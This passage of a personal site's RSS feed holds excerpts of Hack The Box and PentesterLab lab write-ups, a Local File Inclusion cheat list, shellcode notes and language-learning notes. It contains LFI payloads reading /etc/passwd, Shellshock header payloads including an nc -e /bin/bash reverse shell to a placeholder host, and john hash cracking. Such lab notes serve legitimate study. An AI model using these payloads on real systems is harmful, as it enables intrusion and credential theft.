Root Flag sudo /usr/bin/zmupdate.pl --version=1 ...... And voila: ```bash ../machines/medium➤ nc -lvnp 4444 Connection from 10.10.11.245:58446 id uid=0(root) gid=0(root) groups=0(root) TODOs Review https://github.com/Faelian/CraftCMS_CVE-2023-41892/blob/main/craft-cms.py Review CVE-2023-26035: https://raw.githubusercontent.com/rvizx/CVE-2023-26035/main/exploit.py</description></item><item><title/><link>https://www.darvein.net/infosec/htb-notes/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb-notes/readme/</guid><description>hackthebox-notes HTB Learning Notes</description></item><item><title/><link>https://www.darvein.net/infosec/htb/challenges/easy/racecar/racecar/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/challenges/easy/racecar/racecar/</guid><description> easy - racecar After downloading the file racecar.zip, we uncompress. We have an ELF file:
~z➤ file racecar racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped</description></item><item><title/><link>https://www.darvein.net/infosec/htb/codify/codify/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/codify/codify/</guid><description>easy - Codify User flag So we start with the basics
~➤ sudo nmap -n -Pn -sV -O -T4 codify.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.52 3000/tcp open http Node.js Express framework ... Port 80 says they use a nodejs app where the following libs are being used:
https://github.com/patriksimek/vm2/releases/tag/3.9.16 The editor Basically, the /editor page can run some javascript:</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/analytics/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/analytics/</guid><description>easy - Analytics User Ok, so hostname is being revealed:
~z➤ curl -I analytics.htb HTTP/1.1 302 Moved Temporarily Server: nginx/1.18.0 (Ubuntu) Date: Tue, 10 Oct 2023 20:24:22 GMT Content-Type: text/html Content-Length: 154 Connection: keep-alive Location: http://analytical.htb/ ~z➤ curl -I analytical.htb HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Tue, 10 Oct 2023 20:24:56 GMT Content-Type: text/html Content-Length: 17169 Last-Modified: Fri, 25 Aug 2023 15:24:42 GMT Connection: keep-alive ETag: &amp;#34;64e8c7ba-4311&amp;#34; Accept-Ranges: bytes While nmap says the regular ports 22 and 80 are open:</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/busqueda/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/busqueda/</guid><description>easy - Busqueda User flag Yeah!, let&amp;rsquo;s start with this easy one.
A simple curl tells us something, alright, let&amp;rsquo;s upate the /etc/hosts
~f➤ curl -I busqueda.htb HTTP/1.1 302 Found Date: Thu, 15 Jun 2023 00:53:57 GMT Server: Apache/2.4.52 (Ubuntu) Location: http://searcher.htb/ Content-Type: text/html; charset=iso-8859-1 Now we&amp;rsquo;ve got something: &amp;#x2015; Searcher web page &amp;#x2015; A quick look to the HTML source code shows that it uses Flask and uses ArjunSharda/Searchor app:</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/cozyhosting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/cozyhosting/</guid><description>easy - Cozyhosting User Flag Nmap scanning:
~➤ sudo nmap -n -Pn -sV -O -T4 cozyhosting.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) HTML source code:
/login The machine is called Cozy Hosting, so maybe we have subdomains for customers?
Errors: When requesting: https://everything.curl.dev/http/requests/user-agent Whitelabel Error Page This application has no explicit mapping for /error, so you are seeing this as a fallback.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/inject/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/inject/</guid><description>easy - Inject Content User flag Nothing running on tcp/80:
~x» curl inject.htb curl: (7) Failed to connect to inject.htb port 80 after 151 ms: Couldn&amp;#39;t connect to server But found somethinging with nmap:
~x» sudo nmap -nv -Pn -sV -sC -O -T4 -oA nmap-scan 10.129.36.200 ... 22/tcp open ssh 8080/tcp open http-proxy Target web page found at inject.htb:8080/
Checking html source code:
~x» curl -s http://inject.htb:8080/ | xurls https://www.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/keeper/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/keeper/</guid><description>easy - Keeper User flag Ok, from the beginning this machines reveals a host:
~z➤ curl -s keeper.htb | xurls http://tickets.keeper.htb/rt/ We can realize it is a Nginx web server, only SSH and HTTP ports are open:
.../htb/p8/keeper➤ sudo nmap -n -Pn -sV -O -T4 keeper.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) Ok, so we get an ugly web page at http://tickets.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/metatwo-writeup/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/metatwo-writeup/</guid><description>easy - MetaTwo Machine IP Addr: 10.129.36.200
URL: https://app.hackthebox.com/machines/MetaTwo User flag Webserver found and expecting a specific domain:
~» curl -I 10.129.36.200 HTTP/1.1 302 Moved Temporarily Server: nginx/1.18.0 Date: Wed, 30 Nov 2022 01:22:19 GMT Content-Type: text/html Content-Length: 145 Connection: keep-alive Location: http://metapress.htb/ A wordpress app found:
~» curl -I -H &amp;#39;Host: metapress.htb&amp;#39; 10.129.36.200 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Wed, 30 Nov 2022 01:25:00 GMT Content-Type: text/html; charset=UTF-8 Connection: keep-alive X-Powered-By: PHP/8.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/monitorstwo/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/monitorstwo/</guid><description>easy - MonitorsTwo (machine) User Flag I wanted to write this down in spanish but I&amp;rsquo;m not that used to switch my keyboard layout between english and spanish in vim, so&amp;hellip;
➤ curl -s http://monitorstwo/ | elinks --dump User Login Enter your Username and Password below Username [1]_____________________ Password [2]_____________________ [3][ ] Keep me signed in [4][ Login ] Version 1.2.22 | (c) 2004-2023 - The Cacti Group So I remember this Cacti monitoring tool.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/pc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/pc/</guid><description>easy - PC Machine User flag Let&amp;rsquo;s scan the network: ➤ sudo nmap -nv -Pn -sC -sV -O -T4 -oA nmap-scan pc.htb
Which only reports port 22/tcp open:
➤ cat nmap-scan.nmap | ag open 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) Let&amp;rsquo;s try scanning all ports TCP and UDP:
-sS -p- pc.htb -sU -p- pc.htb I&amp;rsquo;ve found this:
50051/tcp open unknown I don&amp;rsquo;t get it yet, there is something on that 50051/tcp port:</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/photobomb/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/photobomb/</guid><description>easy - Photobomb User flag Webserver info:
~p» curl -sI http://photobomb.htb/ HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Fri, 02 Dec 2022 02:39:14 GMT Content-Type: text/html;charset=utf-8 Content-Length: 843 Connection: keep-alive X-Xss-Protection: 1; mode=block X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN » sudo nmap --open --min-rate 5000 -T4 -Pn -p- 10.129.36.119 ... PORT STATE SERVICE 22/tcp open ssh 80/tcp open http At first glance, found some creds:
~p» curl -s http://photobomb.htb/ | grep src &amp;lt;script src=&amp;#34;photobomb.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/pilgrimage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/pilgrimage/</guid><description>easy - pilgrimage Machine: pilgrimage.htb
User flag Basic nmap scanning:
~z➤ sudo nmap -n -Pn -sV -O -T4 pilgrimage.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0 We can notice it is a simple web page, let&amp;rsquo;s see the html content:
~z➤ curl -s http://pilgrimage.htb/ | ag href | ag -v assets ... &amp;lt;a href=&amp;#34;/&amp;#34; class=&amp;#34;logo&amp;#34;&amp;gt; &amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;/&amp;#34; class=&amp;#34;active&amp;#34;&amp;gt;Home&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;login.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/precious/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/precious/</guid><description>easy - Precious User flag Ports scanned
» sudo nmap --open --min-rate 5000 -T4 -Pn -p- 10.129.36.115 ... PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Getting web server info:
~p» curl -sI http://precious.htb/ HTTP/1.1 200 OK Content-Type: text/html;charset=utf-8 Content-Length: 483 Connection: keep-alive Status: 200 OK X-XSS-Protection: 1; mode=block X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN Date: Fri, 02 Dec 2022 02:20:20 GMT X-Powered-By: Phusion Passenger(R) 6.0.15 Server: nginx/1.18.0 + Phusion Passenger(R) 6.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/sau/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/sau/</guid><description>easy - Sau User flag Let&amp;rsquo;s start by running nmap and reviewing any web app.
Nmap results:
sau➤ sudo nmap -n -Pn -sV -O -T4 sau.htb Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-02 09:11 -04 Nmap scan report for sau.htb (10.10.11.224) Host is up (0.15s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 80/tcp filtered http 55555/tcp open unknown 1 service unrecognized despite returning data.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/shoppy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/shoppy/</guid><description>easy - Shoppy User flag Ports scanning:
» sudo nmap --open --min-rate 5000 -T4 -Pn -p- 10.129.227.233 ... PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 9093/tcp open copycat Scanning subdomains:
» gobuster vhost \ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \ --append-domain -t 50 -u shoppy.htb ... Found: mattermost.shoppy.htb Status: 200 [Size: 3122] ... Scanning paths:
» wfuzz -c -z \ file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \ --hc 404 &amp;#34;http://shoppy.htb/FUZZ/&amp;#34; ... ... 000000003: 302 0 L 4 W 28 Ch &amp;#34;admin&amp;#34; 000000039: 200 25 L 62 W 1074 Ch &amp;#34;login&amp;#34; 000000109: 302 0 L 4 W 28 Ch &amp;#34;Admin&amp;#34; 000000160: 200 25 L 62 W 1074 Ch &amp;#34;Login&amp;#34; 000000681: 302 0 L 4 W 28 Ch &amp;#34;ADMIN&amp;#34; 000016032: 200 25 L 62 W 1074 Ch &amp;#34;LOGIN&amp;#34; Found this login page:</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/soccer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/soccer/</guid><description>easy - Soccer Table of Content easy - Soccer Table of Content Content Finding user flag Finding root flag Content Finding user flag At first glance, a web page is found:
Something interesting found during nmap scanning:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-12 23:28 -04 Nmap scan report for soccer.htb (10.129.20.182) Host is up (0.16s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 9091/tcp open xmltec-xmlmail Nmap done: 1 IP address (1 host up) scanned in 15.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/stocker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/stocker/</guid><description>easy - Stocker Content Finding user flag Nmaping the target:
» sudo nmap --open --min-rate 5000 -T4 -Pn -p- stocker.htb Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 11:33 -04 Nmap scan report for stocker.htb (10.129.219.49) Host is up (0.14s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nothing interesting found, I will need to fuzz.
x» curl -s stocker.htb | grep href | grep -v &amp;#39;#&amp;#39; &amp;lt;link rel=&amp;#34;apple-touch-icon&amp;#34; sizes=&amp;#34;180x180&amp;#34; href=&amp;#34;img/apple-touch-icon.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/easy/topology/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/easy/topology/</guid><description>easy - Topology (machine) Table of Content easy - Topology (machine) Table of Content Content User flag Root flag Content User flag At simple glance, we&amp;rsquo;ve got an ubuntu with apache:
➤ curl -I topology.htb HTTP/1.1 200 OK Date: Thu, 15 Jun 2023 13:18:49 GMT Server: Apache/2.4.41 (Ubuntu) Last-Modified: Tue, 17 Jan 2023 17:26:29 GMT ETag: &amp;#34;1a6f-5f27900124a8b&amp;#34; Accept-Ranges: bytes Content-Length: 6767 Vary: Accept-Encoding Content-Type: text/html And nmap can confirm it:</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/hard/gofer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/hard/gofer/</guid><description>hard - Gofer User Flag Directory index: http://gofer.htb/assets/img/ Nothing unusual in the html source code. No special links, no weird comments. What JS libs are being used:
assets/vendor/aos/aos.js assets/vendor/bootstrap/js/bootstrap.bundle.min.js assets/vendor/glightbox/js/glightbox.min.js assets/vendor/isotope-layout/isotope.pkgd.min.js assets/vendor/php-email-form/validate.js assets/vendor/swiper/swiper-bundle.min.js Ok, what about port scanning?
~z➤ sudo nmap -n -Pn -sV -O -T4 gofer.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 25/tcp filtered smtp 80/tcp open http Apache httpd 2.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/hard/snoopy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/hard/snoopy/</guid><description>hard - snoopy User Flag Checking ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) 53/tcp open domain ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux) 80/tcp open http nginx 1.18.0 (Ubuntu) HTML Review The most relevant by reading html source code:
http://snoopy.htb/download?file=announcement.pdf It contains a PDF file compressed in a ZIP file The PDF contains this email: pr@snoopy.htb , Sally Brown, SnoopySec http://snoopy.htb/download It contains a video and a PDF with some info: sbrown@snoopy.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/medium/format/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/medium/format/</guid><description>medium - Format User Flag Ok, after curl-ing it, we can quickly see a host:
z➤ curl -s -i format.htb | ag http HTTP/1.1 200 OK &amp;lt;meta http-equiv=&amp;#34;Refresh&amp;#34; content=&amp;#34;0; url=&amp;#39;http://app.microblog.htb&amp;#39;&amp;#34; /&amp;gt; Also nmap found these ports:
z➤ sudo nmap -n -Pn -sV -O -T4 format.htb ... 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0 3000/tcp open http nginx 1.18.0 Also curl-ing the port 3000 reveals another host:</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/medium/jupiter/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/medium/jupiter/</guid><description>medium - Jupiter User Flag .../htb/p8/jupiter➤ curl -I jupiter.htb HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Fri, 18 Aug 2023 19:03:15 GMT Content-Type: text/html Content-Length: 19680 Last-Modified: Wed, 01 Mar 2023 07:58:53 GMT Connection: keep-alive ETag: &amp;#34;63ff05bd-4ce0&amp;#34; Accept-Ranges: bytes .../htb/p8/jupiter➤ sudo nmap -n -Pn -sV -O -T4 jupiter.htb ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) I couldn&amp;rsquo;t find anything interesting by looking html source code.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/medium/onlyforyou/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/medium/onlyforyou/</guid><description>medium - OnlyForYou User Flag Nmap scanning Interesting finding, many filtered ports, probably open internally only:
z➤ sudo nmap -n -Pn -sV -O -T4 onlyforyou.htb Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-11 08:35 -04 Nmap scan report for onlyforyou.htb (10.10.11.210) Host is up (0.13s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/medium/sandworm/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/medium/sandworm/</guid><description>medium - Sandworm User Flag Ok, let&amp;rsquo;s start, the machine has a vhost listening to ssa.htb
z➤ curl -L sandworm.htb curl: (6) Could not resolve host: ssa.htb We can just see a simple web page:
~z➤ curl -s -L -k ssa.htb | elinks --dump [1]Secret Spy Agency • [2]Home • [3]About • [4]Contact Our Mission We leverage our advantages in technology and cybersecurity consistent with our authorities to strengthen national defense and secure national security systems.</description></item><item><title/><link>https://www.darvein.net/infosec/htb/machines/medium/zipping/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/htb/machines/medium/zipping/</guid><description>medium - Zipping User Flag Port scanning:
~z➤ sudo nmap -n -Pn -sV -O -T4 zipping.htb [sudo] password for n0kt: Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 18:09 -04 Nmap scan report for zipping.htb (10.10.11.229) Host is up (0.14s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.54 ((Ubuntu)) Found while reviewing html code:</description></item><item><title/><link>https://www.darvein.net/infosec/local-file-inclusion/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/local-file-inclusion/</guid><description> Local File Inclusion examples PHP /script.php?page=../../../../../../../../etc/passwd /fi/?page=php://input&amp;amp;cmd=ls vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd: Then need to b64-decode the response ?page=php://filter/resource=/etc/passwd</description></item><item><title/><link>https://www.darvein.net/infosec/pentesterlabs/01-essential-badge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/pentesterlabs/01-essential-badge/</guid><description>Essential badge URL: https://pentesterlab.com/badges/essential Authentication 01 ch: login as a admin
Just a matter to change the cookie auth to admin, text-plain
02 ch: login as admin
Modify the cookie auth which is aea862aa22a0f5b829d5795882889c08 an md5
03 ch: login as admin
Register an user as aDmin username
04 ch: login as admin
Register an user as admin username, with the additional namespace that is ignored by mysql
05 ch: get the flag</description></item><item><title/><link>https://www.darvein.net/infosec/pentesterlabs/02-pcap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/pentesterlabs/02-pcap/</guid><description>PCAPs URL: https://pentesterlab.com/badges/pcap PCAPs 01 to 09, 11 to 20, 22 to 26 notes:
just load the pcap and on wireshark go to &amp;ldquo;Follow TCP Stream&amp;rdquo; tcp.stream eq 0 to filter sequence of tcp packages 08 ex data is base64-ed 10 notes
the capture has an email and an attachment, select the begin til end to get the attachment file: ~/tmp/mailfile $ vim mailfile ~/tmp/mailfile $ uudecode mailfile ~/tmp/mailfile $ ls mailfile the_key.</description></item><item><title/><link>https://www.darvein.net/infosec/pentesterlabs/02-unix/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/pentesterlabs/02-unix/</guid><description>Unix badge url: https://pentesterlab.com/badges/unix unix 15 # localhost ~/tmp $ cat password.txt victim:.KZvc9iQNfERE:18049:0:99999:7::: ~/tmp $ john password.txt --format=descrypt Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16]) Will run 8 OpenMP threads Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status victim15 (victim) # Pentesterlab victim@2fb2419a7083:~$ cat key.txt 95729b33-fc12-4833-9ba1-eb89dc86293d unix 16 # localhost ~/tmp $ cat hash.txt victim:$1$Q7ncB6rF$59kaRvdn0x6eUtrR65/NG0:18049:0:99999:7::: ~/tmp $ john hash.txt --format=md5crypt Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 12x]) Will run 8 OpenMP threads Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status victim12 (victim) # pentesterlab victim@176d1be0ba89:~$ cat key.</description></item><item><title/><link>https://www.darvein.net/infosec/pentesterlabs/03-white_badge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/pentesterlabs/03-white_badge/</guid><description>White badge 01 - shelshock vuln chl: /usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509
url: https://ptl-392ad7d5-0e9e0682.libcurl.so/ exploit:
run bash commands via the User-agent on a http request () { :;}; $(&amp;lt;/etc/passwd) () { :;}; /usr/bin/nc $IP_ADDR $PORT -e /bin/bash notes:
$ echo -e &amp;quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&amp;quot; | nc vulnerable 80 User-Agent: () { :;}; echo $(&amp;lt;/etc/passwd)Aaa 02 - vuln in jwt lib chl: retrieve a key</description></item><item><title/><link>https://www.darvein.net/infosec/shellcodes/shellcodes-notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/shellcodes/shellcodes-notes/</guid><description>Shellcodes notes Table of Content Shellcodes notes Table of Content Content Encoding shellcode By Adding 0x02 to each char Content Where to get all available syscalls?:
/usr/include/asm/unistd_32.h /usr/include/asm/unistd_64.h Available socket&amp;rsquo;s syscalls
/usr/include/linux/net.h Encoding shellcode By Adding 0x02 to each char ... popl %ebx /* get address of /bin/sh */ movl %ebx,%ecx /* copy the address to ecx */ addb $0x6,%cl /* ecx now points to the last character */ loop: cmpl %ebx,%ecx jl skip /* if (ecx&amp;lt;ebx) goto skip */ addb $0x20,(%ecx) /* adds 0x20 to the byte pointed to by %ecx */ decb %cl /* move the pointer down by one */ jmp loop skip: .</description></item><item><title/><link>https://www.darvein.net/infosec/tools/whatever-tooling/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/infosec/tools/whatever-tooling/</guid><description>Pentesting tooling # assetfinder github.com/tomnomnom/assetfinder assetfinder uber.com # httprobe - test ssl/tls - github.com/tomnomnom/httprobe cat domains.txt | httprobe # gron - parse json files - github.com/tomnomnom/gron curl -s http://headers.jsontest.com/ | gron # meg - requets urls from a txt input and endpoints from another txt file - github.com/tomnomnom/meg meg --verbose paths.txt hosts.txt # unfurl - decompose urls by domain, endpoints, keypairs, etc - github.com/tomnomnom/unfurl cat urls.txt | unfurl keypairs # wfuzz - fuzz paths, get/post requests, etc wfuzz -w /usr/share/wfuzz/wordlist/general/common.</description></item><item><title/><link>https://www.darvein.net/lang/en/english-basic-4-weeks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/en/english-basic-4-weeks/</guid><description>English basic in 4 weeks This is aimed to help you learn english in a fast way 100% intense, designed to be applied for 1 month (4-5 weeks).
Everything will be needed here:
Resources: Chatgpt, Google, Youtube, Instagram, Computer, Pen&amp;amp;Paper Yourself: Good sleep, healthy food, 100% focus and attention Vocabulary words:
Office Movies Restaurant Concert Zoo This is the roadmap:
Semana 1: Fundamentos Básicos Conversacion: Saludos básicos o Introducciones personales Revisión de adverbios y preposiciones en inglés.</description></item><item><title/><link>https://www.darvein.net/lang/en/english-notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/en/english-notes/</guid><description>English notes &amp;#x1f1fa;&amp;#x1f1f8; Resources to learn Duolingo! Online resource: &amp;#x1f517; https://www.essentialenglish.review/apps/english-grammar-in-use-with-answers https://www.esl-lab.com/easy/ https://www.bbc.co.uk/learningenglish/english/ English Grammar lessons: &amp;#x1f517; essentialenglish.review (read, document) Advanced english vocabulary: https://open.spotify.com/playlist/68XG5ir68L5IMzwDUKj9ui Study english for free: https://www.englisch-hilfen.de/en/ English free online: https://www.englishpage.com/ Song: clean eastwood song Readings [Kids] Where the Wild Things Are by Maurice Sendak: &amp;#x1f517; https://addi.ehu.es/bitstream/handle/10810/30027/JT_Where%20the%20Wild%20Things%20Are.pdf [Comic] The Amazing Spider-Man Collection Movies Beavis &amp;amp; Butthead ( imdb ) The Scene (2004-2006) ( imdb ), youtube The Simpsons ( imdb ) Mind your language: imdb Music Eminem Reading local ├── Basic English Grammar, Book 1[A4].</description></item><item><title/><link>https://www.darvein.net/lang/fr/french-basic-roadmap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/fr/french-basic-roadmap/</guid><description>Bases de la feuille de route française Grettings Hello: Bonjour (bone-zhoor) Good evening: Bonsoir (bone-swahr) Goodbye: Au revoir (oh ruh-vwahr) Thank you: Merci (mehr-see) You&amp;rsquo;re welcome: De rien (duh ree-uhn); Je vous en prie (zhuh voo zahn pree) Sorry: Pardon (pahr-dohn); Désolé(e) (day-zoh-lay) Excuse me: Excusez-moi (ex-kew-zay mwah) Yes: Oui (wee) No: Non (nohn) How are you?: Comment ça va? (koh-mahn sah vah); Comment allez-vous? (koh-mahn tah-ley voo) I&amp;rsquo;m fine: Ça va bien (sah vah byahn); Je vais bien (zhuh vay byahn) What is your name?</description></item><item><title/><link>https://www.darvein.net/lang/fr/french-notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/fr/french-notes/</guid><description>Notes de langue française &amp;#x1f1eb;&amp;#x1f1f7; Resources Duolingo! https://francais.lingolia.com/en/ https://www.thoughtco.com/french-4133079 https://langue-francaise.tv5monde.com/ https://francaisfacile.rfi.fr/en/exercices/ Listening: https://www.youtube.com/@FrancaisavecPierre CLI Examples: trans -b -p en:fr 'french basics' Apprendre la grammaire française et s’exercer: &amp;#x1f517; francais.lingolia.com (read, document) https://www.lepointdufle.net/p/grammaire.htm https://www.gymglish.com/fr/frantastique-orthographe/grammaire-francaise https://open.spotify.com/show/6YqgG1UezfW9khCvLh8rvw?si=d6799e9926d64c5f Breathless (1960), Jean-Luc Godard Movie: The 400 Blows (1959), by François Truffaut Readings [Kids] Le petit prince: &amp;#x1f517; pdf1 , pdf2 Movies La haine, 1995 imdb Music Stromae ( spotify ) Louane ( spotify ) Zez Christophe Maé General Basic Roadmap Consider these points:</description></item><item><title/><link>https://www.darvein.net/lang/jp/basic-japanese/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/lang/jp/basic-japanese/</guid><description> 日本 Resources Duolingo! 